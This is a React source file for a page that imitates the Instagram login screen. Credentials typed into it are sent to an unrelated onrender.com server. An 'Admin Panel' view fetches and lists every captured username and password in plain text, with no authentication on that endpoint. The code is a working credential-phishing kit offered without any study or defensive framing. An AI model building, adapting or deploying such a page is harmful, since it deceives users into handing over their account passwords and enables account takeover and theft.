import { useState, useEffect } from 'react';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);
  const [users, setUsers] = useState([]); // MongoDB Users List

  const handleLogin = async (e) => {
    e.preventDefault();
    const response = await fetch(
      'https://instagramlogin-mongodb.onrender.com/api/auth/login',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      },
    );

    const data = await response.json();

    if (response.ok) {
      if (data.isAdmin) {
        toast.success('Admin login successful! ');
        setIsAdmin(true);
        fetchUsers(); // Fetch users from MongoDB
      } else {
        toast.success('Login successful! ');
      }
    } else {
      toast.error(data.message || 'Login failed! ');
    }
  };

  
  const fetchUsers = async () => {
    const response = await fetch(
      'https://instagramlogin-mongodb.onrender.com/api/auth/users',
    );
    const data = await response.json();
    setUsers(data);
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50 p-4">
      {!isAdmin ? (
        <div className="p-8 text-center bg-white border rounded-lg shadow-lg w-full max-w-sm">
          <div className="flex justify-center mb-6">
           
          </div>

          <h2 className="mb-6 text-3xl font-bold text-gray-800">Instagram</h2>

          <form onSubmit={handleLogin} className="space-y-4">
            <input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              className="w-full p-3 bg-gray-100 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="w-full p-3 bg-gray-100 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
            <button
              type="submit"
              className="w-full py-3 font-bold text-white transition bg-blue-500 rounded-lg hover:opacity-90"
            >
              Log In
            </button>
          </form>

          <div className="mt-6 text-sm text-gray-600">
            <p>
              Don't have an account?{' '}
              <a href="#" className="font-bold text-blue-500 hover:underline">
                Sign up
              </a>
            </p>
          </div>
        </div>
      ) : (
        <div className="p-8 text-center bg-white border rounded-lg shadow-lg w-full max-w-4xl">
          <h2 className="mb-6 text-3xl font-bold text-gray-800">Admin Panel</h2>
          <div className="overflow-x-auto">
            <table className="w-full border-collapse border border-gray-200">
              <thead>
                <tr className="bg-gray-100">
                  <th className="p-2 border">Username</th>
                  <th className="p-2 border">Password</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user, index) => (
                  <tr key={index} className="border">
                    <td className="p-2 border">{user.username}</td>
                    <td className="p-2 border">{user.password}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      <ToastContainer position="top-right" autoClose={3000} />
    </div>
  );
}

export default App;
